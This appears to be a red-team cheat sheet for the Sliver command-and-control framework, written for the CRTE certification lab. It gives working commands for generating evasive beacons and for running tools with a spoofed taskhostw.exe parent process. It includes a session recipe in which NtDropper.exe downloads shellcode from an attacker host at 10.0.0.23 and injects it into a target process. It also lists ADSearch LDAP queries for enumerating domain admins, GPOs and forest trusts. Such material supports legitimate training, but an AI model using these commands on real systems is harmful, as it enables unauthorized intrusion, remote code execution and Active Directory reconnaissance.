# Sliver C2 And Tools CheatSheet CRTE
Sliver is a C2 created by BishopFox compiled in the go language.

Note: Sliver has a lot of OpSec issues

## Basic Commands



| Command | Info |
| ------ | ------ |
| ```beacons``` | lists current beacons with info
| ```background``` | backgrounds current session (much like msfconsole)
| ```sessions``` | list current sessions
| ```use -i <id>``` | use beacon/session with the given id 
| ```info``` | lists info of current session
| ```armory``` | lists avaliable extensions
| ```armory install <extension>``` | installs an extension
| ```loot``` | displays loot saved
| ```implants``` | displays implants
| ```jobs``` | lists current jobs
| ```pivots``` | lists pivots
| ```pivots tcp -l <port>``` | create tcp pivot with port <port>
| ```interactive``` | used with a beacon to start an interactive session
| ```shell``` | starts an interactive shell

*Note: using ```shell``` is less OppSec friendly and it is recommended to use ```interactive```

## Listeners
Various listeners are support by Sliver and can be automatically started using these various protocols:
```sh
dns
http
https
mtls
```

In the CRTE we use https.
## Beacons
| Options | Info |
| ------ | ------ |
| ```generate beacon <options>``` | base command to generate a beacon
| ```-b or --http http://10.0.0.23``` | use the http or https protocol
| ```-i or --tcp-pivot 10.0.0.23:<port>``` | create a pivot beacon with port ```<port>```
| ```-f or --format shellcode``` | generate the beacon in this format
| ```-N or --name Name``` | the name displayed in Sliver
| ```-e or --evasion``` | creates the beacon with some evasion
| ```-m or --mtls``` | uses mtls protocol
| ```-d or --dns``` | uses dns protocol
| ```-s or --save /path/to/save/file.format``` | displays implants

## Template

For easy copy pasta. In a session, this will execute the specified local tool on the remote machine

```sh
execute-assembly -A /RuntimeWide -d TaskSchedulerRegularMaintenanceDomain -p 'C:\Windows\System32\taskhostw.exe' -t 80 '/home/kali/Desktop/CRTE Tools/Sliver/someTool.exe'
```
## Getting a session
```
1. generate beacon (use shellcode format)
2. host shellcode
3. use NtDropper.exe on target to start your session
```
Obviously there are many ways to do this, however this is what is shown in CRTE
## Tools

##### NtDropper.exe
NtDropper is a PE Loader that we can use to perform process injection into a target a target process. It will download and invoke hosted shellcode.

```NtDropper.exe <IP> <shellcode path>```
ex:
```NtDropper.exe 10.0.0.23 Implants/shellcode.bin```
this will download shellcode directly from ```http://10.0.0.23:80/Implants/shellcode.bin```
##### Enumeration with ADSearch.exe

Helpful tool to enumerate Active Directory. In Sliver, we would execute this tool on the target system by typing:

```execute-assembly -A /RuntimeWide -d TaskSchedulerRegularMaintenanceDomain -p 'C:\Windows\System32\taskhostw.exe' -t 80 '/home/kali/Desktop/CRTE Tools/Sliver/ADSearch.exe' '<options>'```
Basic options:
| Options | Info |
| ------ | ------ |
| ```'--users'``` | Enumerate users
| ```'--computers'``` | Enumerate computers
| ```'--domain-admins'``` | Enumerate domain admins

We can also perform LDAP queries using ADSearch, which makes this a very powerful tool. To do this we would use ```'--search "<query>" --attributes <attributes>'```

If copy pasting, ensure to include the openning and closing ticks
| Search Options | Info |
| ------ | ------ |
| ```'--search "(&(objectCategory=group)(cn=enterprise admins))" --attributes cn,member --domain techcorp.local'``` | Enumerate enterprise admins
| ```'--search "(objectCategory=organizationalUnit)" --attributes name'``` | List all OU's
| ```'--search "(OU=SomeOU)" --attributes distinguishedname'``` | Enumerate DistinguishedName for SomeOU
| ```'--search "(objectCategory=groupPolicyContainer)" --attributes displayname'``` | Enumerate GPO's
| ```'--search "(OU=SomeOU)" --attributes gplink'``` | Enumerate GPOs applied to SomeOU. This is step one. See below table for step 2*
| ```'-d some.domain.local --search "(objectClass=trustedDomain)" --attributes cn,flatName,trustDirection,trustPartner,name,objectClass,trustAttributes --json'``` | Map trusts of some.domain.local. We can add the --json arg to give us the results in json format for readibility |
| ```'-d some.domain.local --search "(trustAttributes=4)" --attributes cn,flatName,trustDirection,trustPartner,name,objectClass,trustAttributes --json'``` | Map External Trusts |
| ```'-d some.trust.local --search "(objectClass=trustedDomain)" --attributes cn,flatName,trustDirection,trustPartner,name,objectClass,trustAttributes --json'``` | Enumerate trusts of a trusting forest |

Step 2* ```'--search "(&(objectCategory=groupPolicyContainer)((|name={gplink ID})))" --attributes displayname'```

MD formatting wouldn't allow me to add |

